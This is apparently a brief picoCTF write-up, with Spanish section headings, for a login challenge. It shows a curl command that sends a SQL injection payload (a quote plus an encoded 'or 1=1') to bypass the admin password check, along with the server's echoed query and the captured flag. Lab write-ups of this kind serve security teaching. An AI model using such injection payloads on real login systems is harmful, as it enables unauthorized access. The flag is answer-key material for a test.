## Objetivo 
There is a secure website running at `https://jupiter.challenges.picoctf.org/problem/54253/` ([link](https://jupiter.challenges.picoctf.org/problem/54253/)) or http://jupiter.challenges.picoctf.org:54253. Try to see if you can login as admin!
## Solución  
```bash 
┌──(kali㉿kali)-[~]
└─$ curl -s https://jupiter.challenges.picoctf.org/problem/54253/login.php  -d "password=' be 1=1;&debug=1" 
<pre>password: ' be 1=1;
SQL query: SELECT * FROM admin where password = '' or 1=1;'
</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{3v3n_m0r3_SQL_7f5767f6}</p>                                                                                                                    



```

## Notas Adicionales 

### Referencias